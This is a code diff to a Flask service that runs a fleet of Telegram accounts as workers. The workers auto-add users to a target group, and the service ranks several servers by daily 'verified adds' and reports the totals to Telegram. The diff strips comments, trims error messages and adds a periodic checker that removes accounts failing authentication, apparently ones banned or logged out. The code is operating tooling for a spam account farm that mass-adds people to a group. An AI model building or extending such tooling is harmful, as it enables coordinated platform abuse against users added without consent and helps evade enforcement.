-# DEVICE/SESSION MANAGEMENT ROUTES
+# DEVICE/SESSION MANAGEMENT
 # ============================================
 @app.route('/api/get-sessions', methods=['POST'])
 def get_sessions():
-    """Get active sessions for an account"""
     try:
         data = request.json
         aid = data.get('accountId')
@@ -1390,23 +1398,18 @@ def get_sessions():
                         current_hash = str(auth.hash)
                     sessions.append(session_info)
                 
-                return {
-                    'success': True,
-                    'sessions': sessions,
-                    'current_hash': current_hash
-                }
+                return {'success': True, 'sessions': sessions, 'current_hash': current_hash}
             except Exception as e:
-                return {'success': False, 'error': str(e)}
+                return {'success': False, 'error': str(e)[:100]}
             finally:
                 await client.disconnect()
         
         return jsonify(run_async(fetch()))
     except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
+        return jsonify({'success': False, 'error': str(e)[:100]})
 
 @app.route('/api/terminate-session', methods=['POST'])
 def terminate_session():
-    """Terminate a specific session"""
     try:
         data = request.json
         aid = data.get('accountId')
@@ -1423,17 +1426,16 @@ def terminate_session():
                 await client(functions.account.ResetAuthorizationRequest(hash=int(hash_to_terminate)))
                 return {'success': True, 'message': 'Session terminated'}
             except Exception as e:
-                return {'success': False, 'error': str(e)}
+                return {'success': False, 'error': str(e)[:100]}
             finally:
                 await client.disconnect()
         
         return jsonify(run_async(terminate()))
     except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
+        return jsonify({'success': False, 'error': str(e)[:100]})
 
 @app.route('/api/terminate-sessions', methods=['POST'])
 def terminate_sessions():
-    """Terminate all other sessions"""
     try:
         data = request.json
         aid = data.get('accountId')
@@ -1456,28 +1458,23 @@ def terminate_sessions():
                         except:
                             pass
                 
-                return {
-                    'success': True,
-                    'message': f'Terminated {terminated} sessions'
-                }
+                return {'success': True, 'message': f'Terminated {terminated} sessions'}
             except Exception as e:
-                return {'success': False, 'error': str(e)}
+                return {'success': False, 'error': str(e)[:100]}
             finally:
                 await client.disconnect()
         
         return jsonify(run_async(terminate()))
     except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
+        return jsonify({'success': False, 'error': str(e)[:100]})
 
 # ============================================
-# RANKING & REPORT ROUTES
+# RANKING & REPORT
 # ============================================
 @app.route('/api/ranking')
 def ranking():
-    """Get ranking of all servers with verified stats"""
     reset_daily()
     
-    # Get our stats
     our_stats = {
         'name': SERVER_NAME,
         'number': SERVER_NUMBER,
@@ -1492,7 +1489,6 @@ def ranking():
     
     all_stats = [our_stats]
     
-    # Fetch from other servers
     for srv in OTHER_SERVERS:
         try:
             r = requests.get(f"{srv['url']}/api/public-stats", timeout=10)
@@ -1523,7 +1519,6 @@ def ranking():
             'url': srv['url']
         })
     
-    # Sort by verified adds (primary), then attempted (secondary)
     all_stats.sort(key=lambda x: (x.get('today_verified', 0), x.get('today_attempted', 0)), reverse=True)
     
     total_verified_today = sum(s.get('today_verified', 0) for s in all_stats)
@@ -1542,19 +1537,18 @@ def ranking():
 
 @app.route('/api/send-report')
 def send_report():
-    """Generate and send comprehensive daily report"""
     reset_daily()
     
-    # Get ranking data
-    ranking_data = ranking().get_json()
-    rankings = ranking_data.get('rankings', [])
-    summary = ranking_data.get('summary', {})
+    resp = ranking()
+    data = resp.get_json()
+    rankings = data.get('rankings', [])
+    summary = data.get('summary', {})
     
     report = f"""
 📊 <b>DAILY AUTO-ADD REPORT</b>
 📅 <b>{datetime.now().strftime('%Y-%m-%d %H:%M UTC')}</b>
 ━━━━━━━━━━━━━━━━━━━━━━
-🏆 <b>RANKINGS (Verified Adds)</b>
+🏆 <b>RANKINGS (Verified)</b>
 ━━━━━━━━━━━━━━━━━━━━━━
 """
     
@@ -1562,7 +1556,6 @@ def send_report():
     for i, s in enumerate(rankings):
         medal = medals[i] if i < 3 else f'{i+1}️⃣'
         status = '⚠️ OFFLINE' if s.get('offline') else '✅ ONLINE'
-        
         verified = s.get('today_verified', 0)
         attempted = s.get('today_attempted', 0)
         rate = round(verified / attempted * 100, 1) if attempted > 0 else 0
@@ -1572,36 +1565,26 @@ def send_report():
         
         report += f"""
 {medal} <b>{s['name']}</b> [{status}]
-   {bar} <b>{verified:,} verified</b> ({rate}%)
-   📥 Attempted: {attempted:,} | 👷 Workers: {s.get('active_workers', '?')}
+   {bar} <b>{verified:,}</b> ({rate}%)
 """
     
     report += f"""
 ━━━━━━━━━━━━━━━━━━━━━━
-📈 <b>SUMMARY</b>
+✅ Verified Today: <b>{summary.get('total_verified_today', 0):,}</b>
+📥 Attempted: <b>{summary.get('total_attempted_today', 0):,}</b>
+🌐 Active: <b>{summary.get('active_servers', 0)}/{summary.get('total_servers', 0)}</b>
 ━━━━━━━━━━━━━━━━━━━━━━
-• ✅ Verified Today: <b>{summary.get('total_verified_today', 0):,}</b>
-• 📥 Attempted Today: <b>{summary.get('total_attempted_today', 0):,}</b>
-• 🌐 Active Servers: <b>{summary.get('active_servers', 0)}/{summary.get('total_servers', 0)}</b>
-• 👑 Leader: <b>{rankings[0]['name']}</b> ({rankings[0].get('today_verified', 0):,} verified)
-━━━━━━━━━━━━━━━━━━━━━━
-🖥️ <b>{SERVER_NAME}</b> (Server #{SERVER_NUMBER})
-📋 Verified: {stats.get('verified_today', 0):,} | Attempted: {stats.get('today_added', 0):,}
+🖥️ <b>{SERVER_NAME}</b> #{SERVER_NUMBER}
 """
     
     send_telegram(report)
     
-    return jsonify({
-        'success': True,
-        'message': 'Report sent to Telegram',
-        'report_preview': report
-    })
+    return jsonify({'success': True, 'message': 'Report sent'})
 
 # ============================================
 # KEEP ALIVE & SCHEDULERS
 # ============================================
 def keep_alive():
-    """Keep the server alive"""
     while True:
         time.sleep(240)
         try:
@@ -1609,8 +1592,20 @@ def keep_alive():
         except:
             pass
 
+def dead_account_checker():
+    """Periodically check all accounts and remove dead ones"""
+    while True:
+        time.sleep(600)  # Every 10 minutes
+        for acc in list(accounts):
+            try:
+                is_auth = check_account_auth(acc)
+                if not is_auth:
+                    remove_dead_account(acc['id'], "Periodic auth check failed")
+                time.sleep(3)
+            except Exception as e:
+                logger.debug(f"Health check error: {e}")
+
 def daily_report_scheduler():
-    """Send daily report automatically"""
     last = None
     while True:
         now = datetime.now()
@@ -1619,7 +1614,6 @@ def daily_report_scheduler():
             time.sleep(random.randint(0, 1800))
             reset_daily()
             
-            # Auto-verify if admin is linked
             admin_id = server_admin.get(str(SERVER_NUMBER))
             if admin_id:
                 admin_acc = next((a for a in accounts if a['id'] == admin_id), None)
@@ -1627,7 +1621,6 @@ def daily_report_scheduler():
                     worker_ids = [a['id'] for a in accounts if a['id'] != admin_id]
                     verify_worker_adds(admin_acc, worker_ids)
             
-            # Send report
             try:
                 requests.get(f"{SERVER_URL}/api/send-report", timeout=30)
             except:
@@ -1636,9 +1629,8 @@ def daily_report_scheduler():
         time.sleep(300)
 
 def auto_verify_scheduler():
-    """Auto-verify every 4 hours"""
     while True:
-        time.sleep(14400)  # 4 hours
+        time.sleep(14400)
         try:
             admin_id = server_admin.get(str(SERVER_NUMBER))
             if admin_id:
@@ -1651,13 +1643,16 @@ def auto_verify_scheduler():
             logger.error(f"Auto-verify error: {e}")
 
 def restore_and_start():
-    """Restore and start all workers on server start"""
     time.sleep(5)
-    for acc in accounts:
+    for acc in list(accounts):
         if acc.get('session'):
-            start_auto_add(acc)
+            # Check auth before starting
+            if check_account_auth(acc):
+                start_auto_add(acc)
+            else:
+                remove_dead_account(acc['id'], "Failed auth check on startup")
             time.sleep(2)
-    logger.info(f"🚀 All {len(accounts)} accounts started")
+    logger.info(f"🚀 All accounts processed")
 
 # ============================================
 # MAIN
@@ -1671,19 +1666,22 @@ if __name__ == '__main__':
 ║  Mode: VERIFIED TRACKING             ║
 ║  Port: {PORT}                           ║
 ║  Admin: {'Linked' if server_admin.get(str(SERVER_NUMBER)) else 'Not linked'}           ║
+║  Dead Check: Every 10 min            ║
 ╚══════════════════════════════════════╝
     """)
     
     threading.Thread(target=keep_alive, daemon=True).start()
     threading.Thread(target=daily_report_scheduler, daemon=True).start()
     threading.Thread(target=auto_verify_scheduler, daemon=True).start()
+    threading.Thread(target=dead_account_checker, daemon=True).start()
     threading.Thread(target=restore_and_start, daemon=True).start()
     
     send_telegram(
         f"🟢 <b>{SERVER_NAME}</b> Online!\n"
         f"📋 Server #{SERVER_NUMBER}\n"
         f"🎯 @{TARGET_GROUP}\n"
-        f"🔍 Verified Tracking Mode\n"
+        f"🔍 Verified Tracking\n"
+        f"🗑️ Auto-remove dead accounts\n"
         f"👑 Admin: {'Linked ✅' if server_admin.get(str(SERVER_NUMBER)) else 'Not linked ❌'}"
     )
     
